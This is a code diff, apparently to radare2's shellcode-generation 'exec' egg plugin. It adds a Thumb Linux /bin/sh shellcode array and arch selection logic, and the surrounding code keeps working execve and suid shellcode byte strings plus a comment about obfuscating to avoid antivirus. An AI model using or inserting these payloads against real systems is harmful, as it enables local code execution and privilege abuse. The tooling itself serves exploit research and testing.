@@ -15,14 +15,14 @@ BINSH: (24 bytes) (x86-32/64):
 // XXX: must obfuscate to avoid antivirus
 // OSX
 static ut8 x86_osx_suid_binsh[] =
-        "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17" 
+        "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17"
 	/* suid */ "\x31\xff\x4c\x89\xc0\x0f\x05"
 	"\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
         "\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff"
 	// CMD
 	"\x2f\x62\x69\x6e\x2f\x73\x68";
 static ut8 x86_osx_binsh[] =
-        "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17" 
+        "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17"
 	// SUIDSH "\x31\xff\x4c\x89\xc0\x0f\x05"
 	"\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
         "\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff"
@@ -50,6 +50,10 @@ static ut8 arm_linux_binsh[] =
 	"\x08\x20\x8d\xe5\x13\x02\xa0\xe1\x07\x20\xc3\xe5\x04\x30\x8f\xe2"
 	"\x04\x10\x8d\xe2\x01\x20\xc3\xe5\x0b\x0b\x90\xef"
 	"\x2f\x62\x69\x6e\x2f\x73\x68"; // "/bin/sh";
+
+static ut8 thumb_linux_binsh[] =
+	"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90"
+	"\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"; // "/bin/sh";
 
 static RBuffer *build (REgg *egg) {
 	RBuffer *buf = r_buf_new ();
@@ -80,30 +84,50 @@ static RBuffer *build (REgg *egg) {
 		}
 		break;
 	case R_EGG_OS_LINUX:
-		if (suid) eprintf ("no suid for this platform\n");
+		if (suid) {
+			eprintf ("no suid for this platform\n");
+		}
 		suid = 0;
 		switch (egg->arch) {
 		case R_SYS_ARCH_X86:
 			switch (egg->bits) {
-			case 32: sc = x86_linux_binsh; break;
-			case 64: sc = x86_64_linux_binsh; break;
-			default: eprintf ("Unsupportted\n");
+			case 32:
+				sc = x86_linux_binsh;
+				break;
+			case 64:
+				sc = x86_64_linux_binsh;
+				break;
+			default:
+				eprintf ("Unsupported arch %d bits\n", egg->bits);
 			}
 			break;
 		case R_SYS_ARCH_ARM:
-			sc = arm_linux_binsh;
+			switch (egg->bits) {
+			case 16:
+				sc = thumb_linux_binsh;
+				break;
+			case 32:
+				sc = arm_linux_binsh;
+				break;
+			default:
+				eprintf ("Unsupported arch %d bits\n", egg->bits);
+			}
 			break;
 		}
 		break;
 	default:
-		eprintf ("unsupported os %x\n", egg->os);
+		eprintf ("Unsupported os %x\n", egg->os);
 		break;
 	}
+
 	if (sc) {
 		r_buf_set_bytes (buf, sc, strlen ((const char *)sc));
 		if (shell && *shell) {
-			if (cd) r_buf_write_at (buf, cd, (const ut8*)shell, strlen (shell)+1);
-			else eprintf ("Cannot set shell\n");
+			if (cd) {
+				r_buf_write_at (buf, cd, (const ut8 *)shell, strlen (shell) + 1);
+			} else {
+				eprintf ("Cannot set shell\n");
+			}
 		}
 	}
 	free (suid);
@@ -120,7 +144,7 @@ REggPlugin r_egg_plugin_exec = {
 };
 
 #ifndef CORELIB
-struct r_lib_struct_t radare_plugin = {
+R_API RLibStruct radare_plugin = {
 	.type = R_LIB_TYPE_EGG,
 	.data = &r_egg_plugin_exec,
 	.version = R2_VERSION
